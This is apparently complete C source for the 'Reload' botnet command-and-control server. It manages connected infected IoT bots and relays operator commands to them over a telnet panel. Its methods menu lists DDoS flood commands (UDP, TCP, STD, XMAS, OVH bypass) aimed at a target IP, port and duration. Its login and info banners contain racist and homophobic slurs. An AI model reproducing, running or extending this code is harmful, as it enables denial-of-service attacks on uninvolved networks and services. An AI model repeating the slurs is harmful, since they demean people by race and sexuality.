/*
Reload.c Server Side
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
						send(i, "User:", 8, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, " ", 1, MSG_NOSIGNAL);
                        send(i, timestamp, strlen(timestamp), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                        	    DUPESDELETED++;
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SC ON\n", 9, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("buf: \"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; Reload | IoT: %d | Online: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
 
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char* admin;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        sprintf(botnet, "Login Faggot\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
		sprintf(botnet, "\e[38;2;89;255;0mUsername:\e[38;2;0;229;255m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){                  
        sprintf(botnet, "\e[38;2;89;255;0mPassword:\e[38;2;0;229;255m "); 
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;
        fak:
        
        pthread_create(&title, NULL, &titleWriter, sock);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end;
	        char banner1 [5000];
		char banner2 [5000];
		char banner3 [5000];
		char banner4 [5000];
		char banner5 [5000];
		char banner6 [5000];
		char banner7 [5000];
		char banner8 [5000];
		char banner9 [80];
        	sprintf(banner1, "                             \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
		sprintf(banner2, "                             \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
		sprintf(banner3, "                             \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
                sprintf(banner4, "                        \e[38;2;89;255;0mType '\e[38;2;0;229;255mHELP\e[38;2;89;255;0m' to see all commands\r\n");
                sprintf(banner9, "\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
        	if(send(thefd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
        	if(send(thefd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        if(strstr(buf, "BOTS")) 
        {  
          sprintf(botnet, "Bots: %d\r\nUsers: %d\r\n", clientsConnected(), managesConnected, DUPESDELETED);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
          
if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncmp(buf, "mETHODS", 7) == 0 || strncmp(buf, "Methods", 7) == 0) {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				char methods1  [800];
				char methods2  [800];
				char methods3  [800];
				char methods4  [800];
				char methods5  [800];
				char methods6  [800];
				char methods7  [800];
				char methods8  [800];
                                char methods9  [800];
                                char methods10  [800];
                                char methods11  [800];
                                char methods12  [800];
                                char methods13  [800];
                                char methods14  [800];

                                sprintf(methods1, "             \e[38;2;0;229;255m╔══════════════════════════════════════════════════════╗\r\n");
                                sprintf(methods2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD    \e[38;2;0;229;255m║\r\n");
                                sprintf(methods3, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* STD [IP] [PORT] [TIME] | STD FLOOD                \e[38;2;0;229;255m║\r\n");
                                sprintf(methods4, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD \e[38;2;0;229;255m║\r\n");
                                sprintf(methods5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD          \e[38;2;0;229;255m║\r\n");
                                sprintf(methods6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* XMAS [IP] [PORT] [TIME]| XMAS FLOOD               \e[38;2;0;229;255m║\r\n");
                                sprintf(methods7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* CRUSH [IP] [PORT] [TIME] 32 ALL 10 1024           \e[38;2;0;229;255m║\r\n");
                                sprintf(methods8, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* OVH [IP] [PORT] [TIME]| OVH BYPASS                \e[38;2;0;229;255m║\r\n");
                                sprintf(methods9, "             \e[38;2;0;229;255m╚══════════════════════════════════════════════════════╝\r\n");

				if(send(thefd, methods1,  strlen(methods1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, methods2,  strlen(methods2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, methods3,  strlen(methods3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, methods4,  strlen(methods4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, methods5,  strlen(methods4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, methods6,  strlen(methods4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, methods7,  strlen(methods7),	MSG_NOSIGNAL) == -1) goto end;
                                if(send(thefd, methods8,  strlen(methods8),	MSG_NOSIGNAL) == -1) goto end;
                                if(send(thefd, methods9,  strlen(methods9),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "hELP", 4) == 0 || strncmp(buf, "Help", 4) == 0) {
        if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				char help1  [800];
				char help2  [800];
				char help3  [800];
				char help4  [800];
				char help5  [800];
				char help6  [800];
				char help7  [800];
				char help8  [800];

        		sprintf(help1, "             \e[38;2;0;229;255m╔═══════════════════════════════════════╗\r\n");
        		sprintf(help2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mMETHODS - Shows Attack Methods.       \e[38;2;0;229;255m║\r\n");
        		sprintf(help5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mINFO - Shows Info.                    \e[38;2;0;229;255m║\r\n");
        		sprintf(help6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mCLEAR - Clears Screen Back To Banner. \e[38;2;0;229;255m║\r\n");
        		sprintf(help7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mEXIT - Exits Out Of Server.           \e[38;2;0;229;255m║\r\n");
        		sprintf(help8, "             \e[38;2;0;229;255m╚═══════════════════════════════════════╝\r\n");

				if(send(thefd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, help5,  strlen(help5), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, help6,  strlen(help6), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, help7,  strlen(help7), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, help8,  strlen(help8), MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
if (strncmp(buf, "info", 4) == 0 || strncmp(buf, "INFO", 4) == 0 || strncmp(buf, "iNFO", 4) == 0 || strncmp(buf, "Info", 4) == 0) {
        if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				char info1  [800];
				char info2  [800];
				char info3  [800];
				char info4  [800];
				char info5  [800];
				char info6  [800];
				char info7  [800];
				char info8  [800];

        		sprintf(info1, "             \e[38;2;0;229;255m╔═══════════════════════════════════════════╗\r\n");
        		sprintf(info2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mThis botnet is made by ONLY by Reload#9575\e[38;2;0;229;255m║\r\n");
        		sprintf(info4, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mIf you get this src ur a nigger           \e[38;2;0;229;255m║\r\n");
        		sprintf(info5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mIf if your not black have fun!            \e[38;2;0;229;255m║\r\n");
        		sprintf(info6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mNo Hitting Over 12000 BTW                 \e[38;2;0;229;255m║\r\n");
        		sprintf(info7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mLastly ur black af monke                  \e[38;2;0;229;255m║\r\n");
        		sprintf(info8, "             \e[38;2;0;229;255m╚═══════════════════════════════════════════╝\r\n");

				if(send(thefd, info1,  strlen(info1), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, info2,  strlen(info2), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, info4,  strlen(info4), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, info5,  strlen(info5), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, info6,  strlen(info6), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, info7,  strlen(info7), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, info8,  strlen(info8), MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
      if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
      if(strstr(buf, "HOODASSSHIT")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
      if(strstr(buf, "HOODASSSHIT")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOGOUT")) 
		{  
		printf("BYE %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("LOGOUT.log", "a");
        fprintf(logFile, "BYE %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }//if you dont like this just take out common sense 
    	if(strstr(buf, "DUP")) 
		{  
	    printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("BOTKILLER.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS %s\n", accounts[find_line].id, buf);
        fclose(logFile);
	    goto end;
		}
		if(strstr(buf, "SH")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "ATTEMPT TO SHELL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
   	   	}
		if(strstr(buf, "MOVE")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "ATTEMPT TO SHELL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
   	   	}
        if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
          if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
        	sprintf(banner1, "                             \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
		sprintf(banner2, "                             \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
		sprintf(banner3, "                             \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
                sprintf(banner4, "                        \e[38;2;89;255;0mType '\e[38;2;0;229;255mHELP\e[38;2;89;255;0m' to see all commands\r\n");
                sprintf(banner9, "\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
        	if(send(thefd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
        	if(send(thefd, banner4, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, banner9, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
         }
         if (strstr(buf, "EXIT")) 
         {
            goto end;
         }
                trim(buf);
                sprintf(botnet, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("server.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("Connected From: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("IP.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 850)
        {
            printf("Are You Dumb? Lower the Threads\n");
            return 0;
        }
        else if (threads < 850)
        {
            printf("Good Choice in Threading\n");
        }
        printf("Reload Botnet.\nCreated by Reload.\r\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
                broadcast("PING", -1, "STRING");
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}
